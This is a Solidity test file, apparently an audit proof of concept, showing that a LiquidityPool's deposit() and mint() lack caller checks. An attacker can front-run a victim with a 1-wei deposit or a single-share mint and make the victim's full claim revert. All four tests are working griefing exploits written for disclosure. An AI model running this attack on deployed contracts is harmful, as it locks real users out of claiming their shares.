// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import "../TestSetup.t.sol";

/**
 * @title ExploitTest - PoC for Deposit/Mint DoS Vulnerability
 * @notice This test demonstrates a critical access control vulnerability in LiquidityPool.sol
 *
 * VULNERABILITY DESCRIPTION:
 * The deposit() and mint() functions in LiquidityPool lack proper access control, allowing
 * any user to process deposits/mints for another user. An attacker can exploit this by:
 * 1. Waiting for a victim to submit a deposit request
 * 2. After epoch execution, front-running the victim's deposit() call
 * 3. Calling deposit() with a tiny amount (e.g., 1 wei) for the victim
 * 4. This partially consumes the victim's maxDeposit allowance
 * 5. When the victim's transaction executes with their full amount, it reverts
 * 6. The victim is DoS'd and cannot claim their shares as intended
 *
 * ROOT CAUSE:
 * - LiquidityPool.deposit() at line 141 has no access control
 * - LiquidityPool.mint() at line 148 has no access control (commented out check)
 * - These functions call InvestmentManager.processDeposit/processMint which consume
 *   from the user's maxDeposit/maxMint allowance
 * - An attacker can consume this allowance on behalf of the victim
 *
 * IMPACT:
 * - Denial of Service: Victims cannot claim their shares
 * - Griefing attack: Attacker can DoS users for minimal cost
 * - User funds remain locked until they adjust their deposit amount
 */
contract ExploitTest is TestSetup {

    // Test parameters
    uint64 poolId = 1;
    bytes16 trancheId = bytes16(bytes("1"));
    uint128 currencyId = 1;
    uint128 price = 1000000; // 1:1 price (6 decimals)

    address victim;
    address attacker;

    LiquidityPool lPool;

    function setUp() public override {
        super.setUp();

        // Create victim and attacker addresses
        victim = address(0x1234);
        attacker = address(0x5678);

        // Deploy liquidity pool
        address lPoolAddress = deployLiquidityPool(
            poolId,
            erc20.decimals(),
            "Test Token",
            "TT",
            trancheId,
            currencyId
        );
        lPool = LiquidityPool(lPoolAddress);

        // Set initial price
        homePools.updateTrancheTokenPrice(poolId, trancheId, currencyId, price);

        // Setup victim: give them tokens and membership
        erc20.mint(victim, 1000000); // 1M tokens
        vm.prank(victim);
        erc20.approve(address(investmentManager), type(uint256).max);
        homePools.updateMember(poolId, trancheId, victim, type(uint64).max);
    }

    /**
     * @notice Test demonstrating the DoS attack via deposit() front-running
     * @dev Attack flow:
     *      1. Victim requests deposit of 1000 tokens
     *      2. Epoch executes, victim has maxDeposit = 1000
     *      3. Attacker front-runs and calls deposit(1, victim) - consumes 1 wei
     *      4. Victim's deposit(1000, victim) call reverts - insufficient maxDeposit
     */
    function testExploit_DepositDoS() public {
        uint256 depositAmount = 1000;

        // ===== STEP 1: Victim requests deposit =====
        vm.prank(victim);
        lPool.requestDeposit(depositAmount, victim);

        // ===== STEP 2: Epoch executes on Centrifuge (simulated) =====
        // After epoch execution, the victim's deposit is fulfilled
        // This increases their maxDeposit allowance
        uint128 trancheTokensPayout = uint128(depositAmount); // 1:1 for simplicity

        vm.prank(address(gateway));
        investmentManager.handleExecutedCollectInvest(
            poolId,
            trancheId,
            victim,
            currencyId,
            uint128(depositAmount),
            trancheTokensPayout
        );

        // Verify victim has maxDeposit allowance
        uint256 maxDepositBefore = lPool.maxDeposit(victim);
        assertEq(maxDepositBefore, depositAmount, "Victim should have maxDeposit");

        // ===== STEP 3: ATTACK - Attacker front-runs victim's deposit =====
        // Attacker calls deposit() with a small amount for the victim
        // This is the vulnerability: no access control on deposit()
        uint256 attackAmount = 100; // Use 100 instead of 1 to avoid rounding issues

        // Anyone can call deposit for the victim - this is the vulnerability!
        vm.prank(attacker);
        lPool.deposit(attackAmount, victim);

        // Verify victim's allowance was consumed
        uint256 maxDepositAfter = lPool.maxDeposit(victim);
        assertLt(maxDepositAfter, maxDepositBefore, "Victim's maxDeposit should be reduced");

        // ===== STEP 4: Victim's transaction fails =====
        // Victim tries to deposit their full amount, but it reverts
        // because maxDeposit is now reduced
        vm.prank(victim);
        vm.expectRevert(bytes("InvestmentManager/amount-exceeds-deposit-limits"));
        lPool.deposit(depositAmount, victim);

        // ===== IMPACT DEMONSTRATED =====
        // The victim is now DoS'd and cannot claim their shares as intended
        // They would need to call deposit() again with the remaining amount
        // This is a griefing attack that disrupts normal user operations
    }

    /**
     * @notice Test demonstrating the DoS attack via mint() front-running
     * @dev Similar to deposit DoS, but using mint() function
     *      Attack flow:
     *      1. Victim requests deposit of 1000 tokens
     *      2. Epoch executes, victim has maxMint = 1000 shares
     *      3. Attacker front-runs and calls mint(1, victim) - consumes 1 share
     *      4. Victim's mint(1000, victim) call reverts - insufficient maxMint
     */
    function testExploit_MintDoS() public {
        uint256 depositAmount = 1000;

        // ===== STEP 1: Victim requests deposit =====
        vm.prank(victim);
        lPool.requestDeposit(depositAmount, victim);

        // ===== STEP 2: Epoch executes on Centrifuge (simulated) =====
        uint128 trancheTokensPayout = uint128(depositAmount);

        vm.prank(address(gateway));
        investmentManager.handleExecutedCollectInvest(
            poolId,
            trancheId,
            victim,
            currencyId,
            uint128(depositAmount),
            trancheTokensPayout
        );

        // Verify victim has maxMint allowance
        assertEq(lPool.maxMint(victim), trancheTokensPayout, "Victim should have maxMint");

        // ===== STEP 3: ATTACK - Attacker front-runs victim's mint =====
        // Attacker calls mint() with 1 share for the victim
        // This is the vulnerability: no access control on mint()
        vm.prank(attacker);
        uint256 assetsUsed = lPool.mint(1, victim);

        // Verify attacker successfully consumed 1 share of victim's allowance
        assertGt(assetsUsed, 0, "Attacker should have consumed assets for victim");
        assertEq(lPool.maxMint(victim), trancheTokensPayout - 1, "Victim's maxMint should be reduced");

        // ===== STEP 4: Victim's transaction fails =====
        // Victim tries to mint their full amount, but it reverts
        vm.prank(victim);
        vm.expectRevert(bytes("InvestmentManager/amount-exceeds-mint-limits"));
        lPool.mint(trancheTokensPayout, victim);

        // ===== IMPACT DEMONSTRATED =====
        // The victim is DoS'd via mint() function as well
    }

    /**
     * @notice Test showing that the vulnerability allows anyone to process deposits
     * @dev This test proves the lack of access control by showing multiple
     *      unauthorized parties can call deposit() for a victim
     */
    function testExploit_NoAccessControl() public {
        uint256 depositAmount = 1000;

        // Setup: Victim requests and epoch executes
        vm.prank(victim);
        lPool.requestDeposit(depositAmount, victim);

        uint128 trancheTokensPayout = uint128(depositAmount);
        vm.prank(address(gateway));
        investmentManager.handleExecutedCollectInvest(
            poolId,
            trancheId,
            victim,
            currencyId,
            uint128(depositAmount),
            trancheTokensPayout
        );

        // ===== VULNERABILITY: Anyone can call deposit() for victim =====

        // Random address 1 can call deposit for victim
        address randomUser1 = address(0xAAAA);
        vm.prank(randomUser1);
        lPool.deposit(100, victim);
        assertEq(lPool.balanceOf(victim), 100, "Random user 1 processed deposit for victim");

        // Random address 2 can also call deposit for victim
        address randomUser2 = address(0xBBBB);
        vm.prank(randomUser2);
        lPool.deposit(200, victim);
        assertEq(lPool.balanceOf(victim), 300, "Random user 2 processed deposit for victim");

        // Even the attacker can call it
        vm.prank(attacker);
        lPool.deposit(300, victim);
        assertEq(lPool.balanceOf(victim), 600, "Attacker processed deposit for victim");

        // ===== EXPECTED BEHAVIOR =====
        // Only the victim should be able to call deposit() for themselves
        // The current implementation allows ANYONE to process deposits for ANY user
        // This breaks the intended access control model
    }

    /**
     * @notice Test demonstrating griefing attack with minimal cost
     * @dev Shows that attacker can DoS multiple victims with very low cost
     */
    function testExploit_LowCostGriefing() public {
        // Setup multiple victims
        address victim1 = address(0x1111);
        address victim2 = address(0x2222);
        address victim3 = address(0x3333);
        address[] memory victims = new address[](3);
        victims[0] = victim1;
        victims[1] = victim2;
        victims[2] = victim3;

        uint256 depositAmount = 10000;

        // Setup all victims with deposits
        for (uint i = 0; i < victims.length; i++) {
            address v = victims[i];

            // Give tokens and membership
            erc20.mint(v, depositAmount);
            vm.prank(v);
            erc20.approve(address(investmentManager), type(uint256).max);
            homePools.updateMember(poolId, trancheId, v, type(uint64).max);

            // Request deposit
            vm.prank(v);
            lPool.requestDeposit(depositAmount, v);

            // Simulate epoch execution
            vm.prank(address(gateway));
            investmentManager.handleExecutedCollectInvest(
                poolId,
                trancheId,
                v,
                currencyId,
                uint128(depositAmount),
                uint128(depositAmount)
            );
        }

        // ===== ATTACK: Attacker DoS's all victims with minimal cost =====
        // Attacker only needs to call deposit(1, victim) for each victim
        // This costs almost nothing but disrupts all victims

        vm.startPrank(attacker);
        for (uint i = 0; i < victims.length; i++) {
            // Front-run each victim with 1 wei deposit
            lPool.deposit(1, victims[i]);
        }
        vm.stopPrank();

        // ===== VERIFY: All victims are now DoS'd =====
        for (uint i = 0; i < victims.length; i++) {
            address v = victims[i];

            // Each victim's full deposit will now fail
            vm.prank(v);
            vm.expectRevert(bytes("InvestmentManager/amount-exceeds-deposit-limits"));
            lPool.deposit(depositAmount, v);

            // Verify their maxDeposit was reduced by 1
            assertEq(lPool.maxDeposit(v), depositAmount - 1, "Victim's maxDeposit should be reduced");
        }

        // ===== IMPACT =====
        // Attacker DoS'd 3 victims with only 3 wei total cost
        // This demonstrates the low-cost griefing potential of this vulnerability
    }
}
